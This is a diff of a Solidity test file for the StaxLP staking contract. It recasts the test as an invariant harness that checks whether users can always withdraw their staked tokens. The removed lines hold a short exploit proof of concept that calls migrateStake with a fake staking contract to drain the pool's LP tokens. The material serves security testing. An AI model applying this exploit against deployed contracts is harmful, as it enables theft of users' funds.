@@ -5,55 +5,44 @@ import "./FakeStaking.sol";
 
 import "contracts/StaxLP.sol";
 import "contracts/StaxLPStaking.sol";
-import "@pwnednomore/contracts/PTest.sol";
+import "@pwnednomore/contracts/invariants/DepositWithdrawalFailureTest.sol";
 
-contract StaxLPStakingTest is PTest {
-    StaxLP lp;
-    StaxLPStaking lpStaking;
+contract StaxLPStakingTest is DepositWithdrawalFailureTest {
+    StaxLP public lp;
+    StaxLPStaking public lpStaking;
 
-    address owner = address(0x1);
-    address user = address(0x2);
-    uint256 userLpAmount = 1 ether;
+    uint256 public constant AMOUNT = 10e18;
+    address public owner;
+    address public user;
 
-    address agent;
-
-    function setUp() public {
-        // Deploy LP token and LP staking contract
+    function deploy() public override {
+        owner = makeAddr("OWNER");
         vm.startPrank(owner);
         lp = new StaxLP("Stax Frax/Temple LP Token", "xFraxTempleLP");
         lpStaking = new StaxLPStaking(address(lp), owner);
         vm.stopPrank();
+    }
 
-        // Create a user who is going to stake 1 ether LP tokens
+    function init() public override {
+        user = makeAddr("USER");
+        deal(address(lp), user, AMOUNT);
+        deposit();
+    }
+
+    function deposit() public override {
         vm.startPrank(user);
-        deal(address(lp), user, userLpAmount);
-        lp.approve(address(lpStaking), type(uint256).max);
+        lp.approve(address(lpStaking), lp.balanceOf(user));
         lpStaking.stakeAll();
         vm.stopPrank();
-
-        agent = getAgent();
     }
 
-    // User should always be able to withdraw the tokens once staked
-    function invariantGetWhatPut() public {
+    function withdraw() public override {
         vm.prank(user);
         lpStaking.withdrawAll(false);
-        assert(lp.balanceOf(user) >= userLpAmount);
     }
 
-    // Exploit
-    function testExploit() public {
-        address attacker = address(0x3);
-        vm.startPrank(attacker);
-
-        FakeStaking fakeStaking = new FakeStaking();
-        uint256 amount = lp.balanceOf(address(lpStaking));
-        lpStaking.migrateStake(address(fakeStaking), amount);
-        lpStaking.withdrawAll(false);
-
-        emit log_named_uint("attacker LP balance: ", lp.balanceOf(attacker));
-        vm.stopPrank();
-
-        invariantGetWhatPut();
+    function invariantDepositWithdrawalFailure() public override {
+        withdraw();
+        assert(lp.balanceOf(user) >= AMOUNT);
     }
 }
